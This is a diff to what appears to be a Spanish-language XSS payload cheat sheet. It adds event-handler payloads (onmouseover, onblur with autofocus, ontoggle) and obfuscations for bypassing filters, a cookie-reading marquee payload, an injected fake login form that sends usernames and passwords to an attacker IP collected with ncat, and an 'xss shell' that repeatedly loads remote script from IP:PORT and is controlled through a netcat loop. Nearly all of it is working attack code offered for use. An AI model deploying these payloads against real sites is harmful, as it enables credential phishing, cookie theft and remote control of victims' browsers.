@@ -20,7 +20,29 @@
 
 ### onMouseOver
 
-`onMouseOver=<script>alert("/XSS BY Y000!/")</script>`
+```
+onMouseOver=<script>alert("/XSS BY Y000!/")</script>
+
+</script><h1 onmouseover= top[8680439..toString(30)]("_Y000!_")>
+
+</script><h1 onmouseover=top[/al/.source+/ert/.source]("_Y000!_")>
+
+</script><h1 onmouseover=["_Y000!_"].find(alert)>
+
+</script><h1 onmouseover= (((confirm)))`_Y000!_`>
+```
+
+### input + onblur + Obfuscation
+
+```
+
+<input onblur=top[/al/.source+/ert/.source]("_Y00!_") autofocus><input autofocus>
+
+<input onblur=["_Y00!_"].find(alert) autofocus><input autofocus>
+
+<input onblur=(((confirm)))("_Y00!_") autofocus><input autofocus>
+
+```
 
 
 ### Xss dentro de un botón en form:
@@ -92,6 +114,10 @@
 `<marquee loop=1 width=0 onfinish=\u0070\u0072\u006f\u006d\u0070\u0074(document.cookie)>Y000</marquee>`
 
 
+### ontoggle
+
+`"><details/open/ontoggle=confirm`/xss_by_Y000!/`>`
+
 ### Filter Bypass Alert Obfuscation
  ```
 (alert)(1)
@@ -104,3 +130,39 @@ top[‘al\145rt’](1)
 top[‘al\x65rt’](1)
 top[8680439..toString(30)](1)
 ```
+
+### ----------------------------------
+
+## HTML para simular un phishing y conseguir datos por ncat
+
+
+### payload a inyectar:
+```
+<h3>Registrate</h3>
+<form action=http://<Ip>:<Puerto>>Usuario:
+<br><input type="username" name="username">
+</br>Contraseña:<br><input type="password" name="password"></br>
+<br><input type="submit" value="Entrar"></br>
+
+```
+
+### para escuchar:
+`ncat -lnvp puerto`
+
+
+
+## xss shell
+
+### payload a inyectar:
+```
+"><script>setInterval(function()
+{d=document;z=d.createElement("scr
+ipt");z.src="//IP:PORT";d.body.appendChild(z)},0)</script>
+```
+
+### para escuchar:
+```
+while :; do printf "Y000>$ "; read c; echo $c | nc -vvlp PORT >/dev/null; done
+```
+
+
